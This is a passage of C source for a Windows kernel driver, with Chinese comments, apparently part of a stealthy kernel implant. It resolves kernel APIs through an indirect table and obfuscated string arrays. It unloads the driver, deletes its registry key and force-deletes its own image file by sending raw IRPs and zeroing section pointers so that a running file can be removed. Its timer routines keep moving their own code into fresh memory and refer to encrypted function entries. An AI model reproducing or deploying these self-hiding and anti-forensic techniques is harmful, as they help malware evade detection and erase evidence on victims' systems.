	//WSK_SERVER_INFO* WskInfo = &pGData->wsk;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;

	SELF_STRING_ARRY* AArry = &pGData->SelfAArry;
	SELF_UNICODE_STRING_ARRY * UArry = &pGData->SelfUArry;

	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, _pGData, 0, 0);

	UNICODE_STRING BasePath;
	fNtos->RtlInitUnicodeString(&BasePath, UArry->AA.Ptr/*L"\\??"*/);
	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, _pGData, 0, 0);
	HANDLE FileHandle = 0;

	OBJECT_ATTRIBUTES ObjectAttributes;

	InitializeObjectAttributes(
		&ObjectAttributes,
		&BasePath,
		OBJ_KERNEL_HANDLE,
		NULL,
		NULL);

	NTSTATUS status = fNtos->ZwOpenDirectoryObject(&FileHandle, 1, &ObjectAttributes);
	if (!NT_SUCCESS(status))
	{
		LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, _pGData, 0, 0);
		//LOG_DEBUG("NtOpenDirectoryObject error  %08X\n", status);
		return status;
	}
	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, _pGData, 0, 0);
	UNICODE_STRING DeviceName;
	fNtos->RtlInitUnicodeString(&DeviceName, lpDeviceName);
	OBJECT_ATTRIBUTES ObjectAttributesDevice;
	InitializeObjectAttributes(
		&ObjectAttributesDevice,
		&DeviceName,
		OBJ_KERNEL_HANDLE,
		FileHandle,
		NULL);

	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, _pGData, 0, 0);
	HANDLE SymbolicLinkHandle = 0;
	status = fNtos->ZwOpenSymbolicLinkObject(&SymbolicLinkHandle, 1u, &ObjectAttributesDevice);

	if (!NT_SUCCESS(status))
	{
		LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, _pGData, 0, 0);
		//LOG_DEBUG("ZwOpenSymbolicLinkObject error  %08X  %wZ\n", status, &DeviceName);
		fNtos->ZwClose(FileHandle);
		return status;
	}
	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, _pGData, 0, 0);
	UNICODE_STRING NtNamePath;
	NtNamePath.Buffer = lpTargetPath;
	NtNamePath.Length = 0;
	NtNamePath.MaximumLength = (USHORT)(ucchMax * 2);
	ULONG nSize = 0;
	status = fNtos->ZwQuerySymbolicLinkObject(SymbolicLinkHandle, &NtNamePath, &nSize);


	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, _pGData, status, 0);

	//LOG_DEBUG("ZwQuerySymbolicLinkObject error  %08X  %wZ\n", status, &DeviceName);

	fNtos->ZwClose(SymbolicLinkHandle);
	fNtos->ZwClose(FileHandle);
	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, _pGData, status, 0);
	return status;
}


BOOL DeviceDosPathToNtPath(PVOID _pGData, wchar_t* pDosPath, wchar_t* pNtPath)
{

	Global_Data* pGData = (Global_Data*)_pGData;
	//WSK_SERVER_INFO* WskInfo = &pGData->wsk;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
	SELF_UNICODE_STRING_ARRY* fUArry = &pGData->SelfUArry;
	SELF_STRING_ARRY* AArry = &pGData->SelfAArry;
	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, _pGData, 0, 0);
	wchar_t    DriveStr[MAX_PATH + 2];
	wchar_t    DevName[MAX_PATH + 2];

	fNtos->memset(DriveStr, 0, sizeof(DriveStr));
	fNtos->memset(DevName, 0, sizeof(DevName));

	wchar_t           Drive[3];
	//INT             cchDevName;
	INT             i = 0;
	//检查参数  

	Drive[0] = pDosPath[i];
	Drive[1] = pDosPath[i + 1];
	Drive[2] = '\0';


	NTSTATUS status = 0;
	SOCKET s = fNtos->s;;
	_FUNCTION_IMP_RET(QueryDosDeviceW, status, NTSTATUS, _pGData, Drive, DevName, MAX_PATH);
	//QueryDosDeviceW(Drive, DevName, MAX_PATH)
	if (!NT_SUCCESS(status))//查询设备名，这里是重点
	{
		return FALSE;
	}
	//cchDevName = lstrlen(DevName);
	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, _pGData, 0, 0);
	//fNtos->RtlStringCbPrintfW(pNtPath, MAX_PATH * 2, fUArry->WsWs.Ptr, DevName, pDosPath + 2);


	fNtos->swprintf_s(pNtPath, MAX_PATH * 2, fUArry->WsWs.Ptr, DevName, pDosPath + 2);

	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, _pGData, 0, 0);
	//lstrcpy(pNtPath, DevName);//复制设备名  
	//lstrcat(pNtPath, pDosPath + 2);//复制路径  
	return TRUE;
}





#define DELAY_ONE_MICROSECOND 	(-10)
#define DELAY_ONE_MILLISECOND	(DELAY_ONE_MICROSECOND*1000)
__forceinline VOID wSleep(PVOID _pGData, LONG msec)
{
	Global_Data* pGData = (Global_Data*)_pGData;
	//WSK_SERVER_INFO* WskInfo = &pGData->wsk;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	LARGE_INTEGER my_interval;
	my_interval.QuadPart = DELAY_ONE_MILLISECOND;
	my_interval.QuadPart *= msec;
	fNtos->KeDelayExecutionThread(KernelMode, 0, &my_interval);
}


void UnLoadDriver_Mother(void* arg) {

	UnLoader_FN* UnLoaderL = (UnLoader_FN*)arg;

	Global_Data* pGData = (Global_Data*)UnLoaderL->_pGData;
	//WSK_SERVER_INFO* WskInfo = &pGData->wsk;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
	SELF_STRING_ARRY* AArry = &pGData->SelfAArry;
	SELF_UNICODE_STRING_ARRY* UArry = &pGData->SelfUArry;

	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, pGData, 0, 0);

	UNICODE_STRING ImagePath;
	fNtos->memset(&ImagePath, 0, sizeof(ImagePath));


	UNICODE_STRING uString;
	fNtos->RtlInitUnicodeString(&uString, (LPCWSTR)UnLoaderL->str);

	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, pGData, 0, 0);

	HANDLE hKey = 0;
	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, &uString, OBJ_KERNEL_HANDLE, NULL, NULL);
	NTSTATUS ntStatus = fNtos->ZwOpenKey(&hKey, KEY_QUERY_VALUE, &oa);
	if (NT_SUCCESS(ntStatus))
	{

		UNICODE_STRING A;
		PKEY_VALUE_PARTIAL_INFORMATION bufA;
		ULONG ActualSize;

		PVOID pImagePath = fNtos->ExAllocatePoolWithTag(PagedPool, sizeof(KEY_VALUE_PARTIAL_INFORMATION) + 100, 'tag');
		bufA = (PKEY_VALUE_PARTIAL_INFORMATION)pImagePath;
		fNtos->RtlInitUnicodeString(&A, UArry->ImagePath.Ptr/*L"ImagePath"*/);
		ntStatus = fNtos->ZwQueryValueKey(hKey, &A, KeyValuePartialInformation, bufA, sizeof(KEY_VALUE_PARTIAL_INFORMATION) + 100, &ActualSize);
		if (!NT_SUCCESS(ntStatus)) {
			fNtos->ExFreePoolWithTag(bufA, 'tag');
			LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, pGData, 0, 0);
		}

		if (NT_SUCCESS(ntStatus)) {

			fNtos->RtlInitUnicodeString(&ImagePath, (PCWSTR)bufA->Data + ((sizeof(L"\\??\\")) / 2 - 1));//

			LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, pGData, 0, 0);
		}
		//LOG_DEBUG("ImagePath:%wZ \n", &ImagePath);
		//ZwDeleteKey(hKey);
		fNtos->ZwClose(hKey);



		NTSTATUS status = 0;
		int i = 0;
		do
		{
			//LOG_DEBUG("ZwUnloadDriver");
			status = fNtos->ZwUnloadDriver(&uString);
			//LOG_DEBUG("ZwUnloadDriver  %08X   %wZ", status, &uString);
			i++;
			if (i > 10) {
				break;
			}
			wSleep(pGData, 10);
		} while (!NT_SUCCESS(status));


		InitializeObjectAttributes(&oa, &uString, OBJ_KERNEL_HANDLE, NULL, NULL);
		ntStatus = fNtos->ZwOpenKey(&hKey, KEY_QUERY_VALUE, &oa);
		if (NT_SUCCESS(ntStatus))
		{
			fNtos->ZwDeleteKey(hKey);
			fNtos->ZwClose(hKey);
		}
		fNtos->ExFreePoolWithTag(arg, 'Tag');

		wchar_t NtPath[MAX_PATH + 2];

		fNtos->memset(NtPath, 0, sizeof(NtPath));

		//__forceinline
		LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, ImagePath.Buffer, 0, 0);
		SOCKET s = fNtos->s;
		_FUNCTION_IMP_NORET(DeviceDosPathToNtPath, pGData, ImagePath.Buffer, NtPath);
		//DeviceDosPathToNtPath(pGData,ImagePath.Buffer, NtPath);
		LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, pGData, 0, 0);
		UNICODE_STRING uPath;
		fNtos->RtlInitUnicodeString(&uPath, NtPath);
		//LOG_DEBUG("NtPath:%wZ \n", &uPath);

		LOG_DEBUG_CODE(AArry->Line_Ptr_WS.Ptr, __LINE__, 0, NtPath);
		//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, pGData, 0, 0);
		_FUNCTION_IMP_NORET(ForceDeleteFile, pGData, NtPath);

		fNtos->ExFreePoolWithTag(pImagePath, 'Tag');


	}
	//ExFreePoolWithTag(arg, 'Tag');
	//wSleep(2000);





	//ForceDeleteFile(NtPath);
	//KeSetEvent(&UnLoaderL->UnLoadEvent, LOW_PRIORITY, FALSE);

}


typedef NTSTATUS (*  _FD_SetFileCompletion)(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp, IN PVOID Context);

NTSTATUS FD_SetFileCompletion(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp,
	IN PVOID Context
)
{

	__try {
		UNREFERENCED_PARAMETER(DeviceObject);
		UNREFERENCED_PARAMETER(Context);

		Global_Data* pGData = (Global_Data*)Context;
		//WSK_SERVER_INFO* WskInfo = &pGData->wsk;
		NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;

		Irp->UserIosb->Status = Irp->IoStatus.Status;
		Irp->UserIosb->Information = Irp->IoStatus.Information;
		fNtos->KeSetEvent(Irp->UserEvent, IO_NO_INCREMENT, FALSE);
		fNtos->IoFreeIrp(Irp);
		return STATUS_MORE_PROCESSING_REQUIRED;
	}
	__except (1) {

	}


}

HANDLE	FD_OpenFile(PVOID _pGData, WCHAR szFileName[])
{
	NTSTATUS			ntStatus;
	UNICODE_STRING		FileName;
	OBJECT_ATTRIBUTES	objectAttributes;
	HANDLE				hFile;
	IO_STATUS_BLOCK		ioStatus;

	Global_Data* pGData = (Global_Data*)_pGData;
	//WSK_SERVER_INFO* WskInfo = &pGData->wsk;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_STRING_ARRY* AArry = &pGData->SelfAArry;
	// 确保IRQL在PASSIVE_LEVEL上
	if (KeGetCurrentIrql() > PASSIVE_LEVEL) {
		//LOG_DEBUG("FD_OpenFile Over   Irql\n");
		return NULL;
	}

	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, _pGData, 0, 0);
	// 初始化文件名
	fNtos->RtlInitUnicodeString(&FileName, szFileName);
	//LOG_DEBUG("%ws\n", FileName.Buffer);

	//初始化对象属性
	InitializeObjectAttributes(&objectAttributes, &FileName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

	// 打开文件

	//sizeof(IOINFO)
//	ntStatus = ZwOpenFile(&hFile, FILE_READ_ATTRIBUTES, &objectAttributes, &ioStatus, FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);
	


	LOG_DEBUG_CODE(AArry->Line_Ptr_WS.Ptr, __LINE__, _pGData, szFileName);

	ntStatus = fNtos->IoCreateFile(&hFile, FILE_READ_ATTRIBUTES, &objectAttributes, &ioStatus,
		0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_DELETE, FILE_OPEN, 0, NULL, 0, CreateFileTypeNone, NULL, IO_NO_PARAMETER_CHECKING);

	if (!NT_SUCCESS(ntStatus)) {

		//LOG_DEBUG("IoCreateFile Error  %08X \n", ntStatus)
		return NULL;

	}
	return  hFile;
}

BOOLEAN	FD_StripFileAttributes(PVOID _pGData, HANDLE FileHandle)
{
	NTSTATUS				ntStatus = STATUS_SUCCESS;
	PFILE_OBJECT			fileObject;
	PDEVICE_OBJECT			DeviceObject;
	PIRP					Irp;
	KEVENT					SycEvent;
	FILE_BASIC_INFORMATION	FileInformation;
	IO_STATUS_BLOCK			ioStatus;
	PIO_STACK_LOCATION		irpSp;


	Global_Data* pGData = (Global_Data*)_pGData;
	//WSK_SERVER_INFO* WskInfo = &pGData->wsk;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;


	SELF_STRING_ARRY* AArry = &pGData->SelfAArry;
	// 获取文件对象
	ntStatus = fNtos->ObReferenceObjectByHandle(FileHandle, DELETE,
		*fNtos->IoFileObjectType, KernelMode, (PVOID*)&fileObject, NULL);

	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, _pGData, 0, 0);

	if (!NT_SUCCESS(ntStatus))
	{
		//LOG_DEBUG("ObReferenceObjectByHandle error!\n");
		return FALSE;
	}

	// 获取与指定文件对象相关联的设备对象
	DeviceObject = fNtos->IoGetRelatedDeviceObject(fileObject);




	// 创建IRP
	Irp = fNtos->IoAllocateIrp(DeviceObject->StackSize, TRUE);
	if (Irp == NULL)
	{
		fNtos->ObfDereferenceObject(fileObject);

		//LOG_DEBUG("FD_StripFileAttributes IoAllocateIrp error\n");
		return FALSE;
	}

	// 初始化同步事件对象
	fNtos->KeInitializeEvent(&SycEvent, SynchronizationEvent, FALSE);

	fNtos->memset(&FileInformation, 0, 0x28);
	FileInformation.FileAttributes = FILE_ATTRIBUTE_NORMAL;

	// 初始化IRP
	Irp->AssociatedIrp.SystemBuffer = &FileInformation;
	Irp->UserEvent = &SycEvent;
	Irp->UserIosb = &ioStatus;
	Irp->Tail.Overlay.OriginalFileObject = fileObject;
	Irp->Tail.Overlay.Thread = (PETHREAD)KeGetCurrentThread();
	Irp->RequestorMode = KernelMode;

	// 设置IRP堆栈信息
	irpSp = IoGetNextIrpStackLocation(Irp);
	irpSp->MajorFunction = IRP_MJ_SET_INFORMATION;
	irpSp->DeviceObject = DeviceObject;
	irpSp->FileObject = fileObject;
	irpSp->Parameters.SetFile.Length = sizeof(FILE_BASIC_INFORMATION);
	irpSp->Parameters.SetFile.FileInformationClass = FileBasicInformation;
	irpSp->Parameters.SetFile.FileObject = fileObject;

	// 设置完成例程

	_FD_SetFileCompletion uFD_SetFileCompletion = 0;
	MEMORY_FLAGS MFlags; SOCKET s = fNtos->s;
	_FUNCTION_ENTRY(FD_SetFileCompletion, MFlags, _FD_SetFileCompletion);

    IoSetCompletionRoutine(Irp, uFD_SetFileCompletion, _pGData, TRUE, TRUE, TRUE);


	
	// 派发IRP
	fNtos->KeEnterCriticalRegion();
	fNtos->IofCallDriver(DeviceObject, Irp);
	fNtos->KeLeaveCriticalRegion();
	// 等待IRP的完成
	fNtos->KeWaitForSingleObject(&SycEvent, Executive, KernelMode, TRUE, NULL);

	// 递减引用计数
	fNtos->ObfDereferenceObject(fileObject);
	//SOCKET s = fNtos->s;;
	FREE_FUNCTION_ENTRY(FD_SetFileCompletion, MFlags);

	return TRUE;
}

BOOLEAN FD_DeleteFile(PVOID _pGData, HANDLE FileHandle)
{
	NTSTATUS          ntStatus = STATUS_SUCCESS;
	PFILE_OBJECT      fileObject;
	PDEVICE_OBJECT    DeviceObject;
	PIRP              Irp;
	KEVENT            SycEvent;
	FILE_DISPOSITION_INFORMATION    FileInformation;
	IO_STATUS_BLOCK					ioStatus;
	PIO_STACK_LOCATION				irpSp;
	PSECTION_OBJECT_POINTERS		pSectionObjectPointer;


	Global_Data* pGData = (Global_Data*)_pGData;
	//WSK_SERVER_INFO* WskInfo = &pGData->wsk;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
	SELF_STRING_ARRY* AArry = &pGData->SelfAArry;

	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, _pGData, 0, 0);
	// 获取文件对象
	ntStatus = fNtos->ObReferenceObjectByHandle(FileHandle, DELETE,
		*fNtos->IoFileObjectType, KernelMode, (PVOID*)&fileObject, NULL);
	if (!NT_SUCCESS(ntStatus))
	{
	//	LOG_DEBUG("ObReferenceObjectByHandle error!\n");
		return FALSE;
	}

	// 获取与指定文件对象相关联的设备对象
	DeviceObject = fNtos->IoGetRelatedDeviceObject(fileObject);

	// 创建IRP
	Irp = fNtos->IoAllocateIrp(DeviceObject->StackSize, TRUE);
	if (Irp == NULL)
	{
		fNtos->ObfDereferenceObject(fileObject);
		//LOG_DEBUG("FD_DeleteFile IoAllocateIrp error\n");
		return FALSE;
	}

	// 初始化同步事件对象
	fNtos->KeInitializeEvent(&SycEvent, SynchronizationEvent, FALSE);

	FileInformation.DeleteFile = TRUE;

	// 初始化IRP
	Irp->AssociatedIrp.SystemBuffer = &FileInformation;
	Irp->UserEvent = &SycEvent;
	Irp->UserIosb = &ioStatus;
	Irp->Tail.Overlay.OriginalFileObject = fileObject;
	Irp->Tail.Overlay.Thread = (PETHREAD)KeGetCurrentThread();
	Irp->RequestorMode = KernelMode;

	// 设置IRP堆栈
	irpSp = IoGetNextIrpStackLocation(Irp);
	irpSp->MajorFunction = IRP_MJ_SET_INFORMATION;
	irpSp->DeviceObject = DeviceObject;
	irpSp->FileObject = fileObject;
	irpSp->Parameters.SetFile.Length = sizeof(FILE_DISPOSITION_INFORMATION);
	irpSp->Parameters.SetFile.FileInformationClass = FileDispositionInformation;
	irpSp->Parameters.SetFile.FileObject = fileObject;

	// 设置完成例程
	SOCKET s = fNtos->s;;
	_FD_SetFileCompletion uFD_SetFileCompletion = 0;
	MEMORY_FLAGS MFlags;
	_FUNCTION_ENTRY(FD_SetFileCompletion, MFlags, _FD_SetFileCompletion);

	IoSetCompletionRoutine(Irp, uFD_SetFileCompletion, _pGData, TRUE, TRUE, TRUE);

	// 如果没有这3行，就无法删除正在运行的文件
	pSectionObjectPointer = fileObject->SectionObjectPointer;
	pSectionObjectPointer->ImageSectionObject = 0;
	pSectionObjectPointer->DataSectionObject = 0;

	// 派发IRP
	//IoCallDriver(DeviceObject, Irp);

	fNtos->KeEnterCriticalRegion();
	fNtos->IofCallDriver(DeviceObject, Irp);
	fNtos->KeLeaveCriticalRegion();

	// 等待IRP完成
	fNtos->KeWaitForSingleObject(&SycEvent, Executive, KernelMode, TRUE, NULL);

	// 递减引用计数
	fNtos->ObfDereferenceObject(fileObject);

	FREE_FUNCTION_ENTRY(FD_SetFileCompletion, MFlags);

	return TRUE;
}

BOOLEAN	ForceDeleteFile(PVOID _pGData, WCHAR szFileName[])
{
	HANDLE		hFile = NULL;
	BOOLEAN		status = FALSE;

	Global_Data* pGData = (Global_Data*)_pGData;
	//WSK_SERVER_INFO* WskInfo = &pGData->wsk;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
	SELF_STRING_ARRY* AArry = &pGData->SelfAArry;
	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, _pGData, 0, 0);
	__try {
		// 打开文件

		SOCKET s = fNtos->s;

		_FUNCTION_IMP_RET(FD_OpenFile, hFile, HANDLE, _pGData, szFileName);
		if (hFile == NULL)		{
			return FALSE;
		}
		BOOLEAN bFlase = FALSE;
		_FUNCTION_IMP_RET(FD_StripFileAttributes, bFlase, BOOLEAN, _pGData, hFile);
		if (bFlase == FALSE){
			fNtos->ZwClose(hFile);
			return FALSE;
		}
		// 删除文件

		_FUNCTION_IMP_RET(FD_DeleteFile, status, BOOLEAN, _pGData, hFile);

		//status = FD_DeleteFile(_pGData, hFile);
		fNtos->ZwClose(hFile);
		return status;
	}
	__except (1) {
		//LOG_DEBUG("execption!\n");
	}
	return FALSE;
}









VOID NTAPI PollingTimer(PKDPC pDpc, PVOID pContext, PVOID SysArg1, PVOID SysArg2) {

	Global_Data* pGData = (Global_Data*)pContext;

	KIRQL irql = (KIRQL)ReadCR8();

	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;

	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;

	DWORD CurIndex = 0;

	if (pGData->Map_CurrentIndex == 0){CurIndex = 1;}

	LARGE_INTEGER NowTime;
	KeQuerySystemTime(&NowTime);









	//--------------------------------   我们要执行的代码




	if (NowTime.QuadPart - pGData->Map_Timer[CurIndex].Time.QuadPart > 1000000)
	{

		if (pGData->Map_Timer[CurIndex].PollingTimer != 0 &&
			pGData->Map_Timer[0].PollingTimer !=
			pGData->Map_Timer[1].PollingTimer) {

			fArry->SetAddressExecute.SelfTradition(pGData, (PVOID)pGData->Map_Timer[CurIndex].PollingTimer, fArry->PollingTimer.MaxSize, 1);
			pGData->fNtos.MmFreeNonCachedMemory((PVOID)pGData->Map_Timer[CurIndex].PollingTimer, PAGE_SIZE);
			pGData->Map_Timer[CurIndex].PollingTimer = 0;

			//_FUNCTION_ENTRY(PollingTimer, pGData->Map_Timer[CurIndex].PollingTimer, _PollingTimer);

		}

		pGData->Map_Timer[CurIndex].Time = NowTime;
	}


	if (pGData->Map_Timer[CurIndex].PollingTimer == 0)
	{
		//_FUNCTION_ENTRY(PollingTimer, pGData->Map_Timer[CurIndex].PollingTimer, _PollingTimer);
	}

	////---------------- 开始插入
	
	pGData->nCount++;



	//WriteCR8(APC_LEVEL);
	//LARGE_INTEGER NowTimeDelay; NowTimeDelay.QuadPart = 100000;
	//KeDelayExecutionThread(KernelMode, TRUE, &NowTimeDelay);
	//WriteCR8(DISPATCH_LEVEL);


	if (NowTime.QuadPart - pGData->Time.QuadPart > 10000000) {

		SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;

		//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr.Ptr,
		//	pGData->nCount, pGData);

		pGData->nCount = 0;

		pGData->Time.QuadPart = NowTime.QuadPart;


		//_CHANGE_FUNCTION_ENTRY(_hEncrypt_DEC, _Kernel_SELFCALL);

        //_CHANGE_FUNCTION_ENTRY(_hEncrypt_DEC_V, _Kernel_SELFCALL);

        //_CHANGE_FUNCTION_ENTRY(SetAddressExecute, _Kernel_SELFCALL);


	}



	fNtos->KeInitializeTimer(&pGData->Map_Timer[CurIndex].Timer);

	fNtos->KeInitializeDpc(&pGData->Map_Timer[CurIndex].Dpc, pGData->Map_Timer[CurIndex].PollingTimer, pGData);




	LARGE_INTEGER DueTime; DueTime.QuadPart = NowTime.QuadPart + 1;//NowTime.QuadPart - 1;



	//fNtos->KeSetTimer(&pGData->Map_Timer[CurIndex].Timer, 
	//	DueTime, &pGData->Map_Timer[CurIndex].Dpc);



	fNtos->KeCancelTimer(&pGData->Map_Timer[pGData->Map_CurrentIndex].Timer);
	pGData->Map_CurrentIndex = CurIndex;
	fNtos->KeSetTimerEx(&pGData->Map_Timer[CurIndex].Timer,
		DueTime, 1, &pGData->Map_Timer[CurIndex].Dpc);


	if (irql != ReadCR8()){WriteCR8(irql);}




	
}

VOID NTAPI PollingExTimer(PEX_TIMER Timer, PVOID Context) {

	Global_Data* pGData = (Global_Data*)Context;

	KIRQL irql = (KIRQL)ReadCR8();

	//WriteCR8(DISPATCH_LEVEL);

	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;

	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;

	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;

	//DWORD CurIndex = 0;

	//if (pGData->Map_CurrentIndex == 0) { CurIndex = 1; }


	DWORD CurIndex = pGData->Map_CurrentIndex;

	DWORD NextIndex = 0;
	if (CurIndex == 0)  
		NextIndex = 1; 


	//WriteCR8(DISPATCH_LEVEL);
	//DWORD64 Ret = 0;
	//_FUNCTION_IMP(FlushWskAccept_SendRecvEx, Ret, pGData);
	//WriteCR8(irql);


	if (pGData->Map_Timer[NextIndex].ExTimer != 0) {
		fNtos->ExDeleteTimer(pGData->Map_Timer[NextIndex].ExTimer, TRUE, FALSE, &pGData->Map_Timer[NextIndex].Delete);
		pGData->Map_Timer[NextIndex].ExTimer = 0;
	}


	LARGE_INTEGER NowTime;
	KeQuerySystemTime(&NowTime);

	if (pGData->Map_Timer[NextIndex].PollingExTimer != 0)
	{
		if (NowTime.QuadPart - pGData->Time.QuadPart > 1000000){
			//FREE_FUNCTION_ENTRY(PollingExTimer, pGData->Map_Timer[NextIndex].PollingExTimer);
		}
	}


	pGData->nCount++;

	pGData->nCountSleep++;

	if (NowTime.QuadPart - pGData->Time.QuadPart > 10000000) {


		if (pGData->Map_Timer[NextIndex].ExTimer == 0)
		{

			if (pGData->Map_Timer[NextIndex].PollingExTimer == 0) {
				//_FUNCTION_ENTRY(PollingExTimer, pGData->Map_Timer[NextIndex].PollingExTimer, _PollingExTimer);
			}
			do {
				pGData->Map_Timer[NextIndex].ExTimer = fNtos->ExAllocateTimer(pGData->Map_Timer[NextIndex].PollingExTimer,
					pGData, EX_TIMER_HIGH_RESOLUTION);
			} while (pGData->Map_Timer[NextIndex].ExTimer == 0);

			//_CHANGE_FUNCTION_ENTRY(_hEncrypt_DEC_V, _Kernel_SELFCALL);

			//_CHANGE_FUNCTION_ENTRY(SetAddressExecute, _Kernel_SELFCALL);

			pGData->Map_CurrentIndex = NextIndex;

			pGData->Time.QuadPart = NowTime.QuadPart;

		}

		//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
		//	__LINE__, pGData, pGData->nCount);

		pGData->nCount = 0;

		if (pGData->nCountSleep > 10000) {

			pGData->DueTime.QuadPart = pGData->DueTime.QuadPart + 1;

		}
		else {
			pGData->DueTime.QuadPart = pGData->DueTime.QuadPart - 1;
			if (pGData->DueTime.QuadPart <= 0) {
				pGData->DueTime.QuadPart = 1;
			}
		}
		pGData->nCountSleep = 0;

		//fNtos->ExSetTimer(pGData->Map_Timer[pGData->Map_CurrentIndex].ExTimer, 0,
		//	pGData->DueTime.QuadPart, &pGData->Map_Timer[pGData->Map_CurrentIndex].TimerParameters);
	}




}

VOID PollingWorker(PVOID Parameter) {

	Global_Data* pGData = (Global_Data*)Parameter;

	KIRQL irql = (KIRQL)ReadCR8();

	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;

//	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;

	DWORD CurIndex = 0;

	if (pGData->Map_CurrentIndex == 0) { CurIndex = 1; }

	LARGE_INTEGER NowTime;
	KeQuerySystemTime(&NowTime);


	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;

	//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr.Ptr,
	//	pGData->nCount, pGData);




	LARGE_INTEGER sTime; sTime.QuadPart = -200000;
	fNtos->KeDelayExecutionThread(KernelMode, FALSE, &sTime);


	//if (NowTime.QuadPart - pGData->Map_Worker[CurIndex].Time.QuadPart > 1000000)
	//{

	//	if (pGData->Map_Worker[CurIndex].PollingWorker != 0 &&
	//		pGData->Map_Worker[0].PollingWorker !=
	//		pGData->Map_Worker[1].PollingWorker) {

	//		fArry->SetAddressExecute.SelfTradition(pGData, (PVOID)pGData->Map_Worker[CurIndex].PollingWorker, fArry->PollingWorker.MaxSize, 1);
	//		pGData->fNtos.MmFreeNonCachedMemory((PVOID)pGData->Map_Worker[CurIndex].PollingWorker, fArry->PollingWorker.nPageSize);
	//		pGData->Map_Worker[CurIndex].PollingWorker = 0;

	//		_FUNCTION_ENTRY(PollingWorker, pGData->Map_Worker[CurIndex].PollingWorker, _PollingWorker);

	//		fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr.Ptr,
	//			__LINE__, pGData->Map_Worker[CurIndex].PollingWorker);
	//	}

	//	pGData->Map_Worker[CurIndex].Time = NowTime;
	//}


	//if (pGData->Map_Worker[CurIndex].PollingWorker == 0)
	//{
	//	_FUNCTION_ENTRY(PollingWorker, pGData->Map_Worker[CurIndex].PollingWorker, _PollingWorker);
	//	fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr.Ptr,
	//		__LINE__, pGData->Map_Worker[CurIndex].PollingWorker);
	//}

	//////---------------- 开始插入

	pGData->nCount++;




